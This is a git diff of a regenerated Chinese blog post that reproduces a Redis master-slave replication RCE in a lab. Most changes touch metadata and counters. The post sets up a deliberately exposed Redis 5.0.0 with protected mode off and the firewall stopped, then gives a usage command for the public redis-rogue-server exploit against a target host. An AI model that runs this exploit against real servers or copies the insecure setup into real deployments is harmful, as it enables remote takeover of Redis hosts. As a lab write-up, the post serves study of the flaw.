@@ -45,7 +45,7 @@
 <meta property="og:image" content="http://mamor5409.github.io/posts/27814dfe/exp.png">
 <meta property="og:image" content="http://mamor5409.github.io/posts/27814dfe/shell.png">
 <meta property="article:published_time" content="2021-07-31T12:04:54.000Z">
-<meta property="article:modified_time" content="2021-07-31T13:25:24.219Z">
+<meta property="article:modified_time" content="2021-07-31T13:25:26.000Z">
 <meta property="article:author" content="Mamor">
 <meta property="article:tag" content="redis">
 <meta name="twitter:card" content="summary">
@@ -251,7 +251,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2021-07-31 20:04:54 / 修改时间：21:25:24" itemprop="dateCreated datePublished" datetime="2021-07-31T20:04:54+08:00">2021-07-31</time>
+              <time title="创建时间：2021-07-31 20:04:54 / 修改时间：21:25:26" itemprop="dateCreated datePublished" datetime="2021-07-31T20:04:54+08:00">2021-07-31</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -276,7 +276,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>932</span>
+              <span>902</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -300,7 +300,7 @@
 <h4 id="主从模式"><a href="#主从模式" class="headerlink" title="主从模式"></a>主从模式</h4><p>主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
 <h4 id="redis模块"><a href="#redis模块" class="headerlink" title="redis模块"></a>redis模块</h4><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。</p>
 <h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 下载redis</span><br><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-5.0.0.tar.gz</span><br><span class="line">tar -xvzf redis-5.0.0.tar.gz</span><br><span class="line">cd redis-5.0.0</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"># 更改配置文件</span><br><span class="line">cd redis-5.0.0</span><br><span class="line">vim redis.conf</span><br><span class="line">      protected-mode yes 改为protected-mode no</span><br><span class="line">      bind 127.0.0.1 改为 bind 0.0.0.0</span><br><span class="line"></span><br><span class="line"># 启动redis</span><br><span class="line">cd src</span><br><span class="line">.&#x2F;redis-server ..&#x2F;redis.conf   # 加载指定配置</span><br><span class="line"></span><br><span class="line"># 关闭防火墙</span><br><span class="line">systemctl stop firewalld </span><br></pre></td></tr></table></figure>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 下载redis</span><br><span class="line">wget http://download.redis.io/releases/redis-5.0.0.tar.gz</span><br><span class="line">tar -xvzf redis-5.0.0.tar.gz</span><br><span class="line">cd redis-5.0.0</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"># 更改配置文件</span><br><span class="line">cd redis-5.0.0</span><br><span class="line">vim redis.conf</span><br><span class="line">      protected-mode yes 改为protected-mode no</span><br><span class="line">      bind 127.0.0.1 改为 bind 0.0.0.0</span><br><span class="line"></span><br><span class="line"># 启动redis</span><br><span class="line">cd src</span><br><span class="line">./redis-server ../redis.conf   # 加载指定配置</span><br><span class="line"></span><br><span class="line"># 关闭防火墙</span><br><span class="line">systemctl stop firewalld </span><br></pre></td></tr></table></figure>
 
 <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>exp下载 <code>https://github.com/n0b0dyCN/redis-rogue-server</code></p>
 <p>用法:<code>python3 redis-rogue-server.py --rhost=192.168.0.182 --lhost=192.168.0.128 --exp=exp.so</code></p>
@@ -458,7 +458,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">177</span>
+          <span class="site-state-item-count">176</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -471,7 +471,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">52</span>
+        <span class="site-state-item-count">51</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -515,12 +515,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">1m</span>
+    <span title="站点总字数">984k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">15:11</span>
+    <span title="站点阅读时长">14:55</span>
 </div>
 
 <!--
@@ -531,7 +531,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共221.6k字</span>
+  <span class="post-count">博客全站共218.1k字</span>
 </div>
 -->
         
